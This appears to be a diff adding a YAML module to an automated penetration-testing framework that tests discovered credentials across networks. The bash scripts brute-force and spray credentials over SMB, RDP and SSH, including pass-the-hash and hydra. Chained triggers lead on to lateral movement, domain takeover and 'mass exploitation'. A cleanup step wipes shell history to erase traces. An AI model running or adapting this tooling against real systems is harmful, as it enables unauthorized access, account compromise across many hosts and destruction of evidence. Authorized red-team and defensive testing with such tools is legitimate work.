@@ -1,0 +1,318 @@
+id: property_based_credential_testing
+name: Credential Testing (Property-Based)
+category: Post-Exploitation
+priority: critical
+description: Automatically test discovered credentials against available services
+detailed_description: |
+  When credentials are discovered (via LLMNR, hash cracking, or other means) and
+  target services are identified, automatically test these credentials in batch
+  across all applicable services (SMB, RDP, SSH, Web, etc.).
+
+# Asset property-based triggers
+asset_triggers:
+  # Trigger when network segment has both credentials and target services
+  - asset_type: network_segment
+    conditions:
+      all:
+        - property: credentials_available
+          operator: exists
+        - any:
+            - property: smb_hosts
+              operator: greater_than
+              value: 0
+            - property: rdp_hosts
+              operator: greater_than
+              value: 0
+            - property: ssh_hosts
+              operator: greater_than
+              value: 0
+            - property: domain_controllers
+              operator: exists
+    priority: 95
+    deduplication_key: "{asset.id}:cred_test:{credentials_available.hash}:{services.hash}"
+    batch_capable: true
+    batch_criteria: credential_source
+    max_batch_size: 100
+    cooldown_period: 3600  # Don't retest same creds for 1 hour
+
+  # Trigger when specific host has services and creds available
+  - asset_type: host
+    conditions:
+      all:
+        - property: credentials_valid
+          operator: not_exists  # Not yet tested
+        - parent_asset:
+            property: credentials_available
+            operator: exists
+        - any:
+            - property: smb_signing
+              operator: equals
+              value: false
+            - property: rdp_enabled
+              operator: equals
+              value: true
+            - property: ssh_enabled
+              operator: equals
+              value: true
+    priority: 90
+    deduplication_key: "{asset.id}:host_cred_test:{parent.credentials.hash}"
+
+# Variable extraction
+variables:
+  all_credentials:
+    source: credentials_available
+    transform: |
+      credentials_available.map(c => ({
+        username: c.username,
+        password: c.password || '',
+        hash: c.hash || '',
+        domain: c.domain || 'WORKGROUP',
+        type: c.password ? 'password' : 'hash'
+      }))
+
+  smb_targets:
+    source: smb_hosts
+    default: []
+
+  rdp_targets:
+    source: rdp_hosts
+    default: []
+
+  ssh_targets:
+    source: ssh_hosts
+    default: []
+
+  output_file:
+    value: "/tmp/cred_test_{asset.id}_{timestamp}.txt"
+
+  success_file:
+    value: "/tmp/cred_success_{asset.id}_{timestamp}.txt"
+
+# Batch command for testing multiple credentials against multiple hosts
+batch_command: |
+  #!/bin/bash
+  OUTPUT="{output_file}"
+  SUCCESS="{success_file}"
+
+  echo "[*] Starting credential testing at $(date)" | tee "$OUTPUT"
+
+  # Create credential files
+  cat > /tmp/users.txt << 'EOF'
+  {all_credentials.map(c => c.username).join('\n')}
+  EOF
+
+  cat > /tmp/passwords.txt << 'EOF'
+  {all_credentials.map(c => c.password).filter(p => p).join('\n')}
+  EOF
+
+  cat > /tmp/hashes.txt << 'EOF'
+  {all_credentials.map(c => c.hash).filter(h => h).join('\n')}
+  EOF
+
+  # Test SMB access
+  if [ -n "{smb_targets}" ]; then
+    echo "[*] Testing SMB access..." | tee -a "$OUTPUT"
+    for host in {smb_targets}; do
+      echo "  [+] Testing $host" | tee -a "$OUTPUT"
+
+      # Password auth
+      while IFS= read -r user && IFS= read -r pass <&3; do
+        if [ -n "$pass" ]; then
+          timeout 5 smbclient -L "//$host" -U "$user%$pass" -N 2>&1 | \
+            grep -q "Sharename" && echo "SUCCESS: SMB $host $user:$pass" | tee -a "$SUCCESS"
+        fi
+      done < /tmp/users.txt 3< /tmp/passwords.txt
+
+      # Hash auth (pass-the-hash)
+      while IFS= read -r user && IFS= read -r hash <&3; do
+        if [ -n "$hash" ]; then
+          pth-smbclient -L "//$host" -U "$user%$hash" --pw-nt-hash 2>&1 | \
+            grep -q "Sharename" && echo "SUCCESS: SMB $host $user:$hash (PTH)" | tee -a "$SUCCESS"
+        fi
+      done < /tmp/users.txt 3< /tmp/hashes.txt
+    done
+  fi
+
+  # Test RDP access
+  if [ -n "{rdp_targets}" ]; then
+    echo "[*] Testing RDP access..." | tee -a "$OUTPUT"
+    for host in {rdp_targets}; do
+      echo "  [+] Testing $host" | tee -a "$OUTPUT"
+
+      while IFS= read -r user && IFS= read -r pass <&3; do
+        if [ -n "$pass" ]; then
+          # Use xfreerdp in check mode
+          timeout 5 xfreerdp /v:"$host" /u:"$user" /p:"$pass" /cert-ignore +auth-only 2>&1 | \
+            grep -q "Authentication only, exit" && echo "SUCCESS: RDP $host $user:$pass" | tee -a "$SUCCESS"
+        fi
+      done < /tmp/users.txt 3< /tmp/passwords.txt
+    done
+  fi
+
+  # Test SSH access
+  if [ -n "{ssh_targets}" ]; then
+    echo "[*] Testing SSH access..." | tee -a "$OUTPUT"
+    for host in {ssh_targets}; do
+      echo "  [+] Testing $host" | tee -a "$OUTPUT"
+
+      # Use hydra for SSH brute force
+      hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 4 -f ssh://"$host" 2>&1 | \
+        grep "host:" | tee -a "$SUCCESS"
+    done
+  fi
+
+  # Parse and update successful credentials
+  echo "[*] Credential testing completed at $(date)" | tee -a "$OUTPUT"
+  echo "[*] Successful credentials found:" | tee -a "$OUTPUT"
+  cat "$SUCCESS" 2>/dev/null | tee -a "$OUTPUT"
+
+  # Cleanup
+  rm -f /tmp/users.txt /tmp/passwords.txt /tmp/hashes.txt
+
+# Individual command for single credential test
+individual_command: |
+  #!/bin/bash
+  # Test single credential against single host
+  USER="{username}"
+  PASS="{password}"
+  HASH="{hash}"
+  HOST="{target_host}"
+  SERVICE="{service}"
+
+  case "$SERVICE" in
+    smb)
+      if [ -n "$PASS" ]; then
+        smbclient -L "//$HOST" -U "$USER%$PASS" -N
+      elif [ -n "$HASH" ]; then
+        pth-smbclient -L "//$HOST" -U "$USER%$HASH" --pw-nt-hash
+      fi
+      ;;
+    rdp)
+      xfreerdp /v:"$HOST" /u:"$USER" /p:"$PASS" /cert-ignore +auth-only
+      ;;
+    ssh)
+      sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$HOST" 'whoami'
+      ;;
+  esac
+
+# Expected property updates
+property_updates:
+  on_success:
+    - property: confirmed_credentials
+      operation: append
+      value:
+        username: "{username}"
+        password: "{password}"
+        valid_on: "{successful_hosts}"
+        services: "{successful_services}"
+        tested_at: "{timestamp}"
+
+    - property: compromised_hosts
+      operation: append
+      value: "{successful_hosts}"
+
+    - property: access_level
+      operation: upgrade
+      conditions:
+        - if: domain_admin_found
+          value: "full"
+        - if: local_admin_found
+          value: "partial"
+
+  on_failure:
+    - property: invalid_credentials
+      operation: append
+      value:
+        username: "{username}"
+        tested_at: "{timestamp}"
+
+# Expected discoveries
+expected_discoveries:
+  - asset_type: host
+    conditions:
+      - credential_valid: true
+    property_updates:
+      credentials_valid: "{valid_credentials}"
+      shell_access: true
+      privilege_level: "{detected_privilege}"
+
+  - asset_type: credential
+    conditions:
+      - validation: success
+    property_updates:
+      confirmed_hosts: "{successful_hosts}"
+      last_tested: "{timestamp}"
+      privilege_level: "{detected_privilege}"
+
+# Chain triggers based on results
+chain_triggers:
+  on_success:
+    - condition:
+        property: domain_admin_credentials
+        operator: exists
+      trigger: domain_takeover
+
+    - condition:
+        property: local_admin_credentials
+        operator: exists
+      trigger: lateral_movement
+
+    - condition:
+        property: compromised_hosts.count
+        operator: greater_than
+        value: 5
+      trigger: mass_exploitation
+
+    - condition:
+        property: sql_sa_credentials
+        operator: exists
+      trigger: sql_server_exploitation
+
+# Outcome analysis
+outcome_analysis:
+  success_indicators:
+    - Valid credentials found
+    - Administrative access obtained
+    - Multiple hosts compromised
+    - Domain credentials validated
+
+  failure_indicators:
+    - All credentials invalid
+    - Account lockout detected
+    - Connection timeouts
+    - Authentication rate limiting
+
+  metrics:
+    - total_credentials_tested: "{credentials.count}"
+    - successful_authentications: "{success.count}"
+    - unique_hosts_accessed: "{unique_hosts.count}"
+    - admin_credentials_found: "{admin_creds.count}"
+
+# Cleanup
+cleanup:
+  - priority: high
+    action: Clear credential files
+    command: |
+      shred -u /tmp/users.txt /tmp/passwords.txt /tmp/hashes.txt 2>/dev/null
+      rm -f {output_file} {success_file}
+
+  - priority: medium
+    action: Clear authentication logs
+    command: |
+      history -c
+      > ~/.bash_history
+
+# Alerting and reporting
+alerts:
+  - condition:
+      property: domain_admin_found
+      value: true
+    severity: critical
+    message: "Domain Administrator credentials discovered!"
+
+  - condition:
+      property: success_rate
+      operator: greater_than
+      value: 0.5
+    severity: high
+    message: "High credential reuse detected - over 50% success rate"
